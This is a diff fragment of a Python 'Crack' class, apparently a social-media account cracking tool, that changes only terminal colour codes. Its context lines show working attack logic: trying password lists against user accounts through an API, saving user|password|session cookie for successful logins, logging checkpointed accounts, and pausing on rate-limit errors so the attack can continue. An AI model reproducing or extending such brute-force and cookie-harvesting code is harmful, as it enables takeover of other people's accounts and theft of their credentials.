@@ -351,7 +351,7 @@ class Crack:
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {U2}•{U2}{U2}[IQBAL_Xyz]•{H2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{U2} CP : {M2}{len(self.cp)}{M2}")
+		prog.update(des,description=f" {U2}•{U2}{U2}[IQBAL_Xyz]•{U2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{U2} CP : {M2}{len(self.cp)}{M2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
@@ -391,7 +391,7 @@ class Crack:
 							self.get_apk(user,pw,cookie)
 						else:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{U2}""",style=f"{color_panel}"),guide_style="bold grey100")
-							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
+							tree.add(Panel(f"{H2}{cookie}{U2}",style=f"{color_panel}"))
 							prints(tree)
 							os.popen('play-audio o.mp3')
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
@@ -402,14 +402,14 @@ class Crack:
 						break
 					else:
 						self.cp.append(user)
-						tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
+						tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{U2}""",style=f"{color_panel}"),guide_style="bold grey100")
 						tree.add(Panel(f"{M2}{ua}{K2}",style=f"{color_panel}"))
 						prints(tree)
 						os.popen('play-audio c.mp3')
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-					prog.update(des,description=f" {M2}•{K2} crack {M2}spam{H2} {str(self.loop)}/{len(tampung)} OK : {M2}{len(self.ok)}{P2} CP : {U2}{len(self.cp)}{U2}")
+					prog.update(des,description=f" {M2}•{U2} crack {M2}spam{H2} {str(self.loop)}/{len(tampung)} OK : {M2}{len(self.ok)}{U2} CP : {U2}{len(self.cp)}{U2}")
 					prog.advance(des)
 					time.sleep(30)
 				else:continue
